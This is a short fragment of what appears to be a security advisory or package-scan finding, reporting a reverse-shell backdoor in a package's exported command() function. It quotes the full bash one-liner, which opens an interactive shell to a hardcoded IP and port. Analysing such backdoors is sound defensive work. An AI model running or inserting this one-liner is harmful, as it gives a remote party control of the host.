  "summary": "Reverse shell backdoor exposed via exported command()",
  "details": "index.js exports a `command()` function that spawns `/bin/bash -c \"bash -i \u003e\u0026 /dev/tcp/10.0.0.145/9999 0\u003e\u00261\" \u0026`, opening an interactive reverse shell to a hardcoded IP (10.0.0.145:9999). Any consumer that requires this package and invokes the exported function gives the operator of that endpoint a live interactive shell on the host running the code. There is no benign reading of this code — the payload is a textbook bash reverse-shell one-liner with no configurability, no documentation, and no relation to any advertised library purpose.",
